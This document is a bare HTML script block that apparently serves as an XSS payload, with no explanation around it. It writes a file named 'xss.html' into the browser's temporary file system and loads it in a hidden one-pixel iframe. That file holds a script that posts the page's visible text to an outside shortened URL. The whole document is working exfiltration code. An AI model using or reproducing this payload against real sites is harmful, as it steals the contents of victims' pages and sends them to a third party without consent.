<script>
webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
  fs.root.getFile('xss.html', { create: true }, function(fileEntry) {
    fileEntry.createWriter(function(writer) {
      const payload = `
        <style>*{color:red;font-size:30px}</style>
        <script>
          fetch('https://tinyurl.com/yz885dsu/xss', {
            method: 'POST',
            body: JSON.stringify({ body: document.body.innerText })
          });
        <\/script>
      `;
      writer.write(new Blob([payload], { type: 'text/html' }));
      writer.onwriteend = function() {
        const url = fileEntry.toURL();
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.width = 1;
        iframe.height = 1;
        iframe.style = "display:none";
        document.body.appendChild(iframe);
      };
    });
  });
});
</script>
